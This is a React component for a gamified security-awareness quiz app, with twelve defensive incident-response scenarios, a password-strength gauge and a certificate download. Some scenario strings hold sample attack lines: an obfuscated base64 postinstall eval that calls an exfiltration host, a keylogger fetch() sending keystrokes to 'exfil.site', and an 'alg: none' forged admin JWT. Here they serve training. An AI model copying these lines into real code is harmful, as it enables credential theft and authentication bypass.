import React, { useState } from "react";
import { 
  Award, Flame, TrendingUp, Compass, Calendar, Trophy, CheckCircle, XCircle, 
  ArrowRight, ShieldAlert, Key, HelpCircle, FileText, Download, Play, Info
} from "lucide-react";
import { motion } from "motion/react";
import { LearningProgress, DailyChallenge, UserAchievement } from "../types";

interface SecurityCoachProps {
  progress: LearningProgress;
  onUpdateProgress: (updated: LearningProgress) => void;
  onAddNotification: (notif: any) => void;
}

const CHALLENGES: DailyChallenge[] = [
  {
    id: "ch-1",
    title: "Typosquatting Lure Spotting",
    type: "phishing",
    scenario: "You receive an urgent security alert stating your account has been breached. The email urges you to log in immediately to secure your credentials. What is the threat level of this URL?",
    content: "Secure Portal Link: https://accounts.g00gle-security.support/auth/login",
    options: [
      { id: "a", text: "Authentic. The domain has 'g00gle' and 'security' with 'https' enabled.", isCorrect: false, explanation: "Https simply encrypts traffic. Anyone can buy an SSL certificate for a fraudulent domain." },
      { id: "b", text: "Malicious. Uses typosquatting ('g00gle' with zeros instead of letters 'oo') and a custom dash suffix to mimic Google.", isCorrect: true, explanation: "Correct! Attackers register similar-looking domains to execute credentials harvesting. Check domains carefully." },
      { id: "c", text: "Authentic. Suffix '.support' is restricted to official consumer support centers.", isCorrect: false, explanation: "Top level domains like .support are public. Anyone can buy them without vetting." }
    ]
  },
  {
    id: "ch-2",
    title: "Out-of-band Wire Approval",
    type: "social_engineering",
    scenario: "An audio message from your CEO on WhatsApp requests an urgent invoice payment to a new offshore development vendor. The voice sounds authentic but lacks natural room acoustics or respiratory pauses. What do you do?",
    content: "Audio Source: CISO_Direct_Memo_2026.wav",
    options: [
      { id: "a", text: "Process the transfer immediately to prevent project blockages.", isCorrect: false, explanation: "Executing financial operations on unverified channels is high-risk for BEC (Business Email Compromise)." },
      { id: "b", text: "Initiate out-of-band secondary verification via corporate Slack or voice call, and report the WhatsApp audio.", isCorrect: true, explanation: "Correct! Generative AI voice clones can be made with 3 seconds of reference audio. Always verify financial changes." },
      { id: "c", text: "Refuse and ignore the message completely without alerting security.", isCorrect: false, explanation: "Ignoring avoids direct loss but leaves the platform vulnerable. Always alert security response units." }
    ]
  },
  {
    id: "ch-3",
    title: "Multi-Factor Authentication (MFA) Push Fatigue",
    type: "social_engineering",
    scenario: "An adversary has obtained your domain password and is repeatedly triggering push notifications to your authenticator app at 3:00 AM. Simultaneously, you receive a text spoofing the IT Helpdesk asking you to approve the push to 'stop the automated maintenance notifications'.",
    content: "SMS: 'IT Helpdesk: We are running a script. Please accept the next Microsoft Authenticator prompt to clear the automated cache. Thank you.'",
    options: [
      { id: "a", text: "Approve the push request to silence the notifications and allow the maintenance script to finish.", isCorrect: false, explanation: "Approving the prompt gives the attacker active domain session cookies, granting full network ingress." },
      { id: "b", text: "Decline all push prompts, ignore the SMS message, and go back to sleep.", isCorrect: false, explanation: "This stops the entry but doesn't fix the compromised password. The attacker can retry or exploit other channels." },
      { id: "c", text: "Explicitly decline the prompts, immediately change your AD domain password, and alert the SOC about the push bombing attack.", isCorrect: true, explanation: "Correct! Denying the request, rotating the compromised credential, and reporting the incident instantly isolates the attacker." }
    ]
  },
  {
    id: "ch-4",
    title: "Malicious NPM Dependency Poisoning",
    type: "osint",
    scenario: "Your CI/CD pipeline fails on a security check. A minor-version update of an open-source logging library contains a suspicious obfuscated postinstall script executing bash commands.",
    content: "package.json: \"dependencies\": { \"logger-core\": \"^2.4.1\" } | postinstall.sh: eval(Buffer.from('Y3VybCAtaHR0cDovL2V4ZmlsdHJhdGUuY28vZW52...', 'base64').toString())",
    options: [
      { id: "a", text: "Run the build with a '--no-postinstall' flag and proceed with compiling the release build.", isCorrect: false, explanation: "While this blocks the immediate script execution, using a poisoned package exposes developers and the runtime environment to high-risk supply chain injections." },
      { id: "b", text: "Pin the dependency to the known safe previous version, inspect the script content, revoke any active .env tokens, and report the package to NPM registry.", isCorrect: true, explanation: "Correct! Mitigating supply chain risk requires locking dependencies to auditable versions, purging any potentially leaked credentials, and alerting upstream registries." },
      { id: "c", text: "Disable the CI/CD pipeline's security check step so that compilation succeeds.", isCorrect: false, explanation: "Disabling security rules to bypass compilation issues is highly reckless and directly invites malware into production." }
    ]
  },
  {
    id: "ch-5",
    title: "Session Cookie Theft via Infostealer Malware",
    type: "password",
    scenario: "An employee logs in using their corporate laptop, which was infected by RedLine Infostealer via a personal download. The attacker bypasses active MFA and accesses corporate email from an unrecognized geolocation.",
    content: "SIEM Log: User login successful from IP: 185.220.101.4 (Tor Exit node). Authentication: 'Cookie-based session replay'. MFA prompt: 'Bypassed (Session Active)'.",
    options: [
      { id: "a", text: "Reset the user's password and ask them to perform another MFA enrollment.", isCorrect: false, explanation: "A password reset does not invalidate existing session cookies that are already cached in active attacker web clients." },
      { id: "b", text: "Revoke all active sessions for the user globally, quarantine the endpoint, run an offline malware scan, and audit session cookie expiration TTLs.", isCorrect: true, explanation: "Correct! Cookie theft (Pass-the-Cookie) is mitigated by killing all active web sessions, isolating the compromised device, and reducing cookie validity windows." },
      { id: "c", text: "Block the specific Tor exit node IP and allow the session to remain active.", isCorrect: false, explanation: "Attackers can quickly change proxy or VPN endpoints. The hijacked session cookie must be revoked immediately." }
    ]
  },
  {
    id: "ch-6",
    title: "Subdomain Takeover via Orphaned DNS CNAME",
    type: "osint",
    scenario: "An old promotional site 'promo.enterprise.com' was decommissioned. However, the DNS CNAME record still points to an expired AWS S3 bucket name. An attacker registers that bucket name in AWS and hosts a custom phishing form.",
    content: "DNS Query: promo.enterprise.com CNAME dev-promo-bucket.s3.amazonaws.com | HTTP Response: 200 OK (Phishing Login UI)",
    options: [
      { id: "a", text: "File an abuse report with AWS to take down the attacker's bucket.", isCorrect: false, explanation: "AWS takedowns can take days. The company still retains the vulnerability, allowing attackers to buy different bucket providers." },
      { id: "b", text: "Delete the stale CNAME DNS record in your zone files.", isCorrect: true, explanation: "Correct! Removing the dangling DNS CNAME record severs the redirect and mitigates the subdomain takeover vulnerability instantly." },
      { id: "c", text: "Purchase a premium SSL certificate for 'promo.enterprise.com' to encrypt the attacker's traffic.", isCorrect: false, explanation: "Encrypting the connection to an attacker's hosted page makes the phishing site look even more secure and authentic." }
    ]
  },
  {
    id: "ch-7",
    title: "AI Voice Cloning Vishing Verification",
    type: "social_engineering",
    scenario: "You receive an urgent Microsoft Teams voice call from a director demanding you generate and share an API read-access token for an internal customer database. The voice is identical to the director, but you notice a slight robotic metallic artifact.",
    content: "Voice payload: 'I'm boarding a plane. This database sync is holding up a $5M contract. I need that API key right now. Direct message it.'",
    options: [
      { id: "a", text: "Provide the API token immediately to ensure the contract is signed.", isCorrect: false, explanation: "Generative voice cloning is incredibly fast and highly convincing. Never share access tokens over unverified channels." },
      { id: "b", text: "Hang up, verify the director's location via official calendar, request verification via registered corporate email, and verbally ask a pre-shared security question.", isCorrect: true, explanation: "Correct! Out-of-band verification and secondary authentication are the gold standards for halting AI-driven vishing." },
      { id: "c", text: "Send a mock/fake API key to trick the caller.", isCorrect: false, explanation: "Attempting to tackle the attacker yourself can lead to further communication, social engineering hooks, or false security senses." }
    ]
  },
  {
    id: "ch-8",
    title: "Public Code Repository Secrets Exposure",
    type: "password",
    scenario: "A junior software developer accidentally commits an active Google Cloud Platform service account JSON private key to a public GitHub repository. Within 45 seconds, automated scanning bots detect the leak.",
    content: "GitHub Secret Alert: 'Exposed GCP service_account private_key in main.py: \"private_key\": \"-----BEGIN PRIVATE KEY-----\\nMIIEvgIB...\"'",
    options: [
      { id: "a", text: "Delete the file from GitHub using the web browser UI and commit a dummy replacement.", isCorrect: false, explanation: "Standard commits leave the historic file in git history tree logs. Bots can still crawl older commits to fetch the secret." },
      { id: "b", text: "Force-push an empty branch, delete the repository, and re-create it under a new URL.", isCorrect: false, explanation: "Deleting the repository is highly disruptive and doesn't revoke the active credential. Attackers already fetched the credential in the first 45 seconds." },
      { id: "c", text: "Revoke the service account key immediately in the GCP Cloud Console, rotate the keys, and use git-filter-repo to clean git history.", isCorrect: true, explanation: "Correct! Credential invalidation in the provider is the ONLY way to guarantee containment. Scrub history next to protect the metadata." }
    ]
  },
  {
    id: "ch-9",
    title: "Ransomware DMZ DMZ-to-LAN Propagation Containment",
    type: "osint",
    scenario: "A public-facing web server in the DMZ segment has been infected with LockBit ransomware. The server is beginning to run rapid network scans on port 445 (SMB) attempting to map internal file shares.",
    content: "SIEM Alert: Source IP 192.168.10.12 (Web-DMZ) initiating 500 connections/min to port 445 on 192.168.20.0/24 subnet.",
    options: [
      { id: "a", text: "Initiate an full backup sequence on the internal fileshares to preserve records.", isCorrect: false, explanation: "Attempting to backup while active ransomware is scanning port 445 can expose the backup server itself to encryption." },
      { id: "b", text: "Isolate the infected web-server network segment, drop DMZ-to-Internal firewall routes, and shut down the target VM.", isCorrect: true, explanation: "Correct! Swift network segmentation and VM isolation isolates the contagion, preventing lateral movement across corporate subnets." },
      { id: "c", text: "Contact the ransom negotiating team to get upfront encryption key details.", isCorrect: false, explanation: "Contacting the threat actor should only occur after containment, forensics, and corporate executive signoff." }
    ]
  },
  {
    id: "ch-10",
    title: "Adversary-in-the-Middle (Evilginx) Bypass",
    type: "phishing",
    scenario: "An employee clicks a realistic phishing link mimicking your Okta SSO page. The phishing server proxies requests to okta.com in real-time. The user logs in and completes their SMS MFA. The attacker steals the authenticated session cookie.",
    content: "HTTP Stream: Client -> Phishing Host (evilginx-prox.cc) -> Okta SSO -> Client (Interception of 'sid' session cookies).",
    options: [
      { id: "a", text: "Transition your identity provider to strictly enforce FIDO2 WebAuthn (passkeys or hardware security keys) and disable SMS MFA.", isCorrect: true, explanation: "Correct! FIDO2 binds authentication directly to the cryptographic domain origin in the browser, preventing proxy interception of session tokens." },
      { id: "b", text: "Ask the employee to change their password to a longer and more complex phrase.", isCorrect: false, explanation: "Longer passwords are still fully proxyable. MitM servers capture whatever credentials the user inputs, regardless of complexity." },
      { id: "c", text: "Change the SMS phone number on the profile to a backup cell phone.", isCorrect: false, explanation: "SMS codes are still manually inputted by the target and proxied to the real server, maintaining vulnerability." }
    ]
  },
  {
    id: "ch-11",
    title: "JWT Algorithm Callback Manipulation",
    type: "password",
    scenario: "Your application verifies SSO log-ins via JWT tokens. During code review, you find the token verification algorithm is dynamically read from the JWT header without strict signature enforcement.",
    content: "JWT Header: { \"alg\": \"none\", \"typ\": \"JWT\" } | Payload: { \"user\": \"admin\", \"role\": \"superuser\" }",
    options: [
      { id: "a", text: "Base64 decode the signature block and manually verify the character length matches standard length guidelines.", isCorrect: false, explanation: "Length checks are trivial to forge. signature validation must rely on true cryptographic verification." },
      { id: "b", text: "Explicitly enforce static verification keys, reject 'alg: none' in the verification layer, and strictly specify permissible algorithms (e.g., HS256).", isCorrect: true, explanation: "Correct! Restricting JWT parser configurations to accept only specified cryptographically-sound signature algorithms blocks header spoofing." },
      { id: "c", text: "Rely on HTTPS transport layer security (TLS) to prevent manipulation of the token during transit.", isCorrect: false, explanation: "TLS protects transit, but a malicious client can generate and sign their own 'alg: none' token on their local device before sending it." }
    ]
  },
  {
    id: "ch-12",
    title: "Malicious Chrome Extension Keylogging",
    type: "deepfake",
    scenario: "An employee installs a PDF-utility Chrome extension that requests permission to 'read and change all your data on the websites you visit'. The extension exfiltrates form fields on internal finance portals.",
    content: "Manifest.json: \"permissions\": [ \"webNavigation\", \"<all_urls>\" ] | script.js: document.addEventListener('keypress', (e) => fetch('http://exfil.site/log?val=' + e.key))",
    options: [
      { id: "a", text: "Ask the user to disable the extension while performing sensitive web tasks.", isCorrect: false, explanation: "Users frequently forget to toggle extensions, and modern extensions run silent background tasks." },
      { id: "b", text: "Configure Enterprise Group Policy to enforce Chrome extension whitelisting, block '<all_urls>' permissions, and purge the extension.", isCorrect: true, explanation: "Correct! Centralized GPO whitelisting and permission bounding prevents unauthorized extensions from acting as credential keyloggers." },
      { id: "c", text: "Re-install Chrome in safe-mode to see if the keystroke logger is automatically blocked.", isCorrect: false, explanation: "Re-installing doesn't block the extension policy or prevent the user from re-enabling the extension under normal run environments." }
    ]
  }
];

export default function SecurityCoach({ progress, onUpdateProgress, onAddNotification }: SecurityCoachProps) {
  const [activeChallengeIdx, setActiveChallengeIdx] = useState(0);
  const [selectedOptionId, setSelectedOptionId] = useState<string | null>(null);
  const [answered, setAnswered] = useState(false);
  const [testPassword, setTestPassword] = useState("");
  const [testResult, setTestResult] = useState<{ crackTime: string; strength: string; color: string } | null>(null);

  // Dynamic AI Challenge state
  const [customChallenge, setCustomChallenge] = useState<DailyChallenge | null>(null);
  const [isGeneratingAi, setIsGeneratingAi] = useState(false);

  const activeChallenge = customChallenge || CHALLENGES[activeChallengeIdx];

  const generateAiChallenge = async () => {
    setIsGeneratingAi(true);
    try {
      const response = await fetch("/api/coach/generate", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        }
      });
      if (response.ok) {
        const data = await response.json();
        setCustomChallenge(data);
        setAnswered(false);
        setSelectedOptionId(null);
        onAddNotification({
          id: "notif-coach-ai-" + Date.now(),
          title: "AI Security Challenge Ready",
          message: `Live threat scenario loaded: '${data.title}'`,
          type: "coach",
          timestamp: new Date().toISOString(),
          read: false
        });
      } else {
        throw new Error("Failed to compile AI scenario");
      }
    } catch (err) {
      console.error(err);
      alert("Failed to contact Gemini neural compiler. Please check connectivity or API key.");
    } finally {
      setIsGeneratingAi(false);
    }
  };

  const textShadowStyle = {
    textShadow: "0 1.5px 3px rgba(0,0,0,0.95), 0 3px 10px rgba(0,0,0,0.95), 0 0 5px rgba(0,0,0,0.9)"
  };

  const handleAnswerSubmit = (optionId: string) => {
    if (answered) return;
    setSelectedOptionId(optionId);
    setAnswered(true);

    const selectedOption = activeChallenge.options.find(o => o.id === optionId);
    if (selectedOption?.isCorrect) {
      // Award XP
      const addedXp = 150;
      let newXp = progress.xp + addedXp;
      let newLevel = progress.level;
      const xpNeeded = progress.level * 1000;
      let leveledUp = false;

      if (newXp >= xpNeeded) {
        newXp = newXp - xpNeeded;
        newLevel += 1;
        leveledUp = true;
      }

      // Update topics mastered if not already there
      const topic = activeChallenge.type.toUpperCase();
      const newTopics = progress.topicsMastered.includes(topic) 
        ? progress.topicsMastered 
        : [...progress.topicsMastered, topic];

      // Re-calculate accuracy
      const newCompleted = progress.completedQuizzes + 1;
      const newAccuracy = Math.round(((progress.completedQuizzes * (progress.quizAccuracy / 100) + 1) / newCompleted) * 100);

      // Check achievements
      const updatedAchievements = [...progress.achievements];
      if (newCompleted === 1 && !progress.achievements.find(a => a.id === "ac-first")) {
        const firstQuizAchievement: UserAchievement = {
          id: "ac-first",
          title: "First Blood",
          description: "Completed first security training scenario successfully.",
          unlockedAt: new Date().toISOString(),
          icon: "Trophy",
          xpValue: 100
        };
        updatedAchievements.push(firstQuizAchievement);
        newXp += 100;
        
        onAddNotification({
          id: "notif-ach-" + Date.now(),
          title: "Achievement Unlocked: First Blood",
          message: "You have earned the 'First Blood' coaching badge!",
          type: "achievement",
          timestamp: new Date().toISOString(),
          read: false
        });
      }

      // Check rank promotion
      let newRank = progress.cyberRank;
      if (newLevel >= 8) newRank = 'Cyber Guardian';
      else if (newLevel >= 5) newRank = 'Security Expert';
      else if (newLevel >= 3) newRank = 'Blue Team Analyst';
      else if (newLevel >= 2) newRank = 'Threat Hunter';

      const updatedProgress: LearningProgress = {
        ...progress,
        xp: newXp,
        level: newLevel,
        completedQuizzes: newCompleted,
        quizAccuracy: newAccuracy,
        topicsMastered: newTopics,
        cyberRank: newRank,
        achievements: updatedAchievements,
        streakDays: progress.streakDays + (progress.streakDays === 0 ? 1 : 0) // advance streak if 0
      };

      onUpdateProgress(updatedProgress);

      if (leveledUp) {
        onAddNotification({
          id: "notif-lvl-" + Date.now(),
          title: "Level Up!",
          message: `Congratulations! You leveled up to Level ${newLevel}. Cyber Rank: ${newRank}`,
          type: "coach",
          timestamp: new Date().toISOString(),
          read: false
        });
      }
    } else {
      // Wrong answer - update accuracy stats
      const newCompleted = progress.completedQuizzes + 1;
      const newAccuracy = Math.round(((progress.completedQuizzes * (progress.quizAccuracy / 100)) / newCompleted) * 100);
      onUpdateProgress({
        ...progress,
        completedQuizzes: newCompleted,
        quizAccuracy: newAccuracy
      });
    }
  };

  const handleNextChallenge = () => {
    setAnswered(false);
    setSelectedOptionId(null);
    if (customChallenge) {
      setCustomChallenge(null);
    } else {
      setActiveChallengeIdx((prev) => (prev + 1) % CHALLENGES.length);
    }
  };

  const evaluatePasswordStrength = (pass: string) => {
    setTestPassword(pass);
    if (!pass) {
      setTestResult(null);
      return;
    }

    let crackTime = "1.5 milliseconds";
    let strength = "Critical Vulnerability";
    let color = "text-red-500 border-red-500/20 bg-red-500/10";

    const hasUpper = /[A-Z]/.test(pass);
    const hasLower = /[a-z]/.test(pass);
    const hasNumber = /[0-9]/.test(pass);
    const hasSpecial = /[^A-Za-z0-9]/.test(pass);
    const len = pass.length;

    if (len >= 12 && hasUpper && hasLower && hasNumber && hasSpecial) {
      crackTime = "42,000 Years";
      strength = "Military-Grade Cryptographic Boundary";
      color = "text-emerald-400 border-emerald-500/20 bg-emerald-500/10";
    } else if (len >= 8 && ((hasUpper && hasLower && hasNumber) || (hasLower && hasNumber && hasSpecial))) {
      crackTime = "4 Months";
      strength = "Moderate Business Defense";
      color = "text-amber-400 border-amber-500/20 bg-amber-500/10";
    } else if (len >= 6) {
      crackTime = "12 Minutes";
      strength = "Low Client Defense";
      color = "text-rose-400 border-rose-500/20 bg-rose-500/10";
    }

    setTestResult({ crackTime, strength, color });
  };

  const downloadCompletionCertificate = () => {
    const certText = `=====================================================
CYBERKAVACH ENTERPRISE TRAINING BOARD
=====================================================
This is to certify that the operative

              SEC_ANALYST_${progress.cyberRank.replace(/ /g, "_").toUpperCase()}

has completed the advanced AI Security Coaching track.
- Final Mastery Level: Level ${progress.level}
- Security Accuracy Rating: ${progress.quizAccuracy}%
- Designated Professional Rank: ${progress.cyberRank.toUpperCase()}

Verification Token: CK-CERT-${Math.floor(Math.random() * 900000 + 100000)}
=====================================================
Secure boundaries require persistent micro-knowledge loops.`;

    const blob = new Blob([certText], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `CyberKavach_Security_Certificate_${progress.cyberRank.replace(/ /g, "_")}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  return (
    <div className="flex-1 relative min-h-0 min-w-0 bg-transparent overflow-y-auto text-slate-200">
      <div className="relative min-h-full p-8 w-full z-10 flex flex-col">
        {/* Background Image */}
        <div className="absolute inset-0 pointer-events-none overflow-hidden -z-10 select-none">
          <motion.img 
            initial={{ opacity: 0, scale: 1.15, filter: "blur(6px)" }}
            animate={{ opacity: 1.0, scale: 1.0, filter: "blur(0px)" }}
            transition={{ duration: 1.6, ease: "easeOut" }}
            src="https://raw.githubusercontent.com/jkbharti159/Patriotic-images/main/Are%20the%20odds%20announcements%20on%20my%20platform%20really%20being%20synchronized%20in%20real-time_.jpeg"
            alt="Security Coach Background"
            referrerPolicy="no-referrer"
            className="w-full h-full object-cover animate-bg-pan-zoom"
          />
          {/* Elegant dark semi-transparent overlay to guarantee supreme text readability */}
          <div className="absolute inset-0 bg-slate-950/70" />
        </div>

        {/* HUD Header */}
        <div className="flex justify-between items-center mb-8 pb-4 border-b border-slate-800/80">
          <div>
            <h2 className="text-2xl font-bold text-white tracking-wide flex items-center gap-2" style={textShadowStyle}>
              <Award className="w-6 h-6 text-cyan-400 font-bold" />
              AI SECURITY COACH
            </h2>
            <p className="text-xs text-slate-300 font-mono font-medium" style={textShadowStyle}>
              Hone tactical threat evaluation vectors, level up credentials defenses, and simulate malware attacks.
            </p>
          </div>

          <button
            onClick={downloadCompletionCertificate}
            className="px-4 py-2 border border-cyan-500/30 rounded bg-transparent text-xs text-white font-mono hover:bg-cyan-500/20 transition-all flex items-center gap-2 shadow-lg"
            style={textShadowStyle}
          >
            <Download className="w-3.5 h-3.5" />
            <span>EXPORT COACH CERTIFICATE</span>
          </button>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          
          {/* Game center panel */}
          <div className="lg:col-span-2 flex flex-col gap-6">
            
            {/* Daily scenario challenge */}
            <div className="p-6 rounded border border-cyan-500/20 bg-transparent shadow-xl relative" style={textShadowStyle}>
              <div className="scanline"></div>
              
              <div className="flex justify-between items-center border-b border-cyan-500/20 pb-3 mb-4 flex-wrap gap-2">
                <span className="text-[10px] font-mono text-cyan-400 uppercase tracking-widest font-bold">
                  {customChallenge ? "✨ DYNAMIC AI CHALLENGE" : "DAILY CHALLENGE SCENARIO"}
                </span>
                <div className="flex items-center gap-3">
                  <button
                    onClick={generateAiChallenge}
                    disabled={isGeneratingAi}
                    className="text-[9px] text-cyan-400 hover:text-cyan-300 border border-cyan-500/30 hover:border-cyan-500 bg-transparent px-2.5 py-1 rounded font-mono transition-all uppercase cursor-pointer disabled:opacity-40 flex items-center gap-1"
                  >
                    {isGeneratingAi ? "Generating..." : "✨ Generate AI Challenge"}
                  </button>
                  {customChallenge && (
                    <button
                      onClick={() => {
                        setCustomChallenge(null);
                        setAnswered(false);
                        setSelectedOptionId(null);
                      }}
                      className="text-[9px] text-slate-300 hover:text-slate-100 border border-slate-700 hover:border-slate-600 bg-transparent px-2 py-1 rounded font-mono transition-all uppercase cursor-pointer"
                    >
                      Standard List
                    </button>
                  )}
                  {!customChallenge && (
                    <span className="text-[10px] font-mono text-slate-300 uppercase font-semibold">Challenge {activeChallengeIdx + 1} of {CHALLENGES.length}</span>
                  )}
                </div>
              </div>

              <h3 className="text-base font-bold text-white font-mono mb-2" style={textShadowStyle}>{activeChallenge.title}</h3>
              <p className="text-xs text-slate-200 font-sans leading-relaxed mb-4" style={textShadowStyle}>{activeChallenge.scenario}</p>
              
              {activeChallenge.content && (
                <div className="p-4 bg-transparent border border-cyan-500/20 rounded font-mono text-[11px] text-cyan-300 mb-6 break-all">
                  {activeChallenge.content}
                </div>
              )}

              {/* Quiz choices */}
              <div className="flex flex-col gap-3 font-mono text-xs">
                {activeChallenge.options.map((opt) => {
                  const isSelected = selectedOptionId === opt.id;
                  const showSuccess = answered && opt.isCorrect;
                  const showFailure = answered && isSelected && !opt.isCorrect;

                  return (
                    <button
                      key={opt.id}
                      onClick={() => handleAnswerSubmit(opt.id)}
                      disabled={answered}
                      className={`p-4 border rounded text-left transition-all cursor-pointer ${
                        showSuccess 
                          ? "bg-emerald-950/30 border-emerald-500 text-emerald-300 shadow-lg" 
                          : showFailure 
                            ? "bg-rose-950/30 border-rose-500 text-rose-300"
                            : isSelected 
                              ? "bg-cyan-950/40 border-cyan-400 text-cyan-300" 
                              : "bg-transparent border-slate-800 text-slate-300 hover:border-cyan-500/20 hover:text-white"
                      }`}
                      style={textShadowStyle}
                    >
                      <div className="flex justify-between items-center">
                        <span className="leading-relaxed">{opt.text}</span>
                        {showSuccess && <CheckCircle className="w-4.5 h-4.5 text-emerald-400 flex-shrink-0 ml-2" />}
                        {showFailure && <XCircle className="w-4.5 h-4.5 text-rose-400 flex-shrink-0 ml-2" />}
                      </div>
                      
                      {answered && isSelected && (
                        <div className="mt-2 pt-2 border-t border-white/10 text-[11px] leading-relaxed font-sans text-slate-200" style={textShadowStyle}>
                          {opt.explanation}
                        </div>
                      )}
                    </button>
                  );
                })}
              </div>

              {answered && (
                <div className="mt-6 flex justify-end">
                  <button
                    onClick={handleNextChallenge}
                    className="px-4 py-2 bg-transparent border border-cyan-500/30 hover:border-cyan-400 text-white font-mono text-xs font-bold rounded flex items-center gap-2 transition-all cursor-pointer"
                    style={textShadowStyle}
                  >
                    <span>NEXT THREAT SCENARIO</span>
                    <ArrowRight className="w-4 h-4" />
                  </button>
                </div>
              )}
            </div>

            {/* Password Cracker Simulator */}
            <div className="p-6 rounded border border-cyan-500/20 bg-transparent shadow-xl flex flex-col gap-4" style={textShadowStyle}>
              <div>
                <h4 className="text-xs font-bold text-white uppercase tracking-wider font-mono flex items-center gap-2">
                  <Key className="w-4 h-4 text-cyan-400" />
                  Credential Entropy Simulator
                </h4>
                <p className="text-[9px] text-slate-300 uppercase font-mono mt-0.5">Test real-time brute-force complexity thresholds.</p>
              </div>

              <div className="flex flex-col gap-4 text-xs font-mono">
                <div>
                  <input
                    type="password"
                    value={testPassword}
                    onChange={(e) => evaluatePasswordStrength(e.target.value)}
                    placeholder="Enter test password to gauge complexity..."
                    className="w-full bg-transparent border border-cyan-500/30 focus:border-cyan-400 px-3 py-2.5 rounded text-white font-bold placeholder-slate-400 focus:outline-none transition-all text-xs"
                    style={textShadowStyle}
                  />
                </div>

                {testResult && (
                  <div className={`p-4 rounded border flex flex-col md:flex-row gap-4 justify-between items-center bg-transparent ${testResult.color.replace(/bg-[^\s]+/g, "bg-transparent")}`} style={textShadowStyle}>
                    <div>
                      <p className="text-[9px] text-slate-300 uppercase font-bold">ESTIMATED BRUTE-FORCE TIME:</p>
                      <p className="text-lg font-extrabold text-white mt-0.5">{testResult.crackTime}</p>
                    </div>
                    <div className="text-right">
                      <p className="text-[9px] text-slate-300 uppercase font-bold">ENTROPY CATEGORY:</p>
                      <p className="text-xs font-bold text-white mt-0.5">{testResult.strength}</p>
                    </div>
                  </div>
                )}
              </div>
            </div>

          </div>

          {/* Leaderboard/Progress side panel */}
          <div className="lg:col-span-1 flex flex-col gap-6 font-mono text-xs">
                      {/* XP score progress */}
            <div className="p-6 rounded border border-cyan-500/20 bg-transparent shadow-xl flex flex-col gap-4" style={textShadowStyle}>
              <div className="flex justify-between items-center">
                <div>
                  <p className="text-[9px] text-slate-300 uppercase font-bold">OPERATIVE RANK</p>
                  <p className="text-sm font-extrabold text-cyan-400 mt-0.5">{progress.cyberRank}</p>
                </div>
                <div className="p-2.5 rounded bg-cyan-950/60 border border-cyan-500/30">
                  <Flame className="w-5 h-5 text-amber-500 animate-pulse" />
                </div>
              </div>

              <div className="flex justify-between items-end text-[10px] mt-2">
                <span>LEVEL {progress.level}</span>
                <span>{progress.xp} / {progress.level * 1000} XP</span>
              </div>
              <div className="w-full bg-cyan-950/40 h-2 rounded overflow-hidden">
                <div className="bg-cyan-400 h-full transition-all duration-300" style={{ width: `${(progress.xp / (progress.level * 1000)) * 100}%` }}></div>
              </div>

              <div className="grid grid-cols-2 gap-4 mt-2 pt-4 border-t border-cyan-500/20 text-center">
                <div className="p-3 bg-transparent rounded border border-cyan-500/20" style={textShadowStyle}>
                  <p className="text-[9px] text-slate-300 uppercase font-bold">Daily Streak</p>
                  <p className="text-lg font-extrabold text-white mt-1">{progress.streakDays} Days</p>
                </div>
                <div className="p-3 bg-transparent rounded border border-cyan-500/20" style={textShadowStyle}>
                  <p className="text-[9px] text-slate-300 uppercase font-bold">Accuracy Rate</p>
                  <p className="text-lg font-extrabold text-white mt-1">{progress.quizAccuracy}%</p>
                </div>
              </div>
            </div>

            {/* Topic Mastery progress check */}
            <div className="p-6 rounded border border-cyan-500/20 bg-transparent shadow-xl flex flex-col gap-4" style={textShadowStyle}>
              <h3 className="text-xs font-bold text-white uppercase tracking-wider">SECURE TOPICS MASTERED</h3>
              <div className="flex flex-col gap-2">
                {["PHISHING", "DEEPFAKE", "PASSWORD", "SOCIAL_ENGINEERING", "OSINT"].map((topic) => {
                  const isMastered = progress.topicsMastered.includes(topic);
                  return (
                    <div key={topic} className="flex justify-between items-center p-2.5 border border-cyan-500/20 bg-transparent rounded" style={textShadowStyle}>
                      <span className="font-bold">{topic.replace("_", " ")}</span>
                      <span className={`text-[9px] font-bold px-1.5 py-0.5 rounded border ${
                        isMastered ? "bg-emerald-950/30 text-emerald-400 border-emerald-500/20" : "bg-transparent text-slate-400 border-slate-700"
                      }`}>
                        {isMastered ? "MASTERED" : "LOCKED"}
                      </span>
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Unlocked Achievements list */}
            <div className="p-6 rounded border border-cyan-500/20 bg-transparent shadow-xl flex flex-col gap-4" style={textShadowStyle}>
              <h3 className="text-xs font-bold text-white uppercase tracking-wider">UNLOCKED ACCREDITATIONS</h3>
              <div className="flex flex-col gap-2 max-h-48 overflow-y-auto pr-1">
                {progress.achievements.length > 0 ? (
                  progress.achievements.map((ach) => (
                    <div key={ach.id} className="p-3 border border-cyan-500/20 bg-transparent rounded flex gap-3 items-center" style={textShadowStyle}>
                      <div className="p-1.5 rounded bg-amber-500/15 text-amber-400 border border-amber-500/30">
                        <Trophy className="w-4 h-4" />
                      </div>
                      <div>
                        <p className="font-bold text-white text-[11px]">{ach.title}</p>
                        <p className="text-[9px] text-slate-300 mt-0.5">{ach.description}</p>
                      </div>
                    </div>
                  ))
                ) : (
                  <p className="text-slate-400 text-[10px] text-center uppercase py-3" style={textShadowStyle}>No accreditations unlocked yet</p>
                )}
              </div>
            </div>

          </div>

        </div>
      </div>
    </div>
  );
}
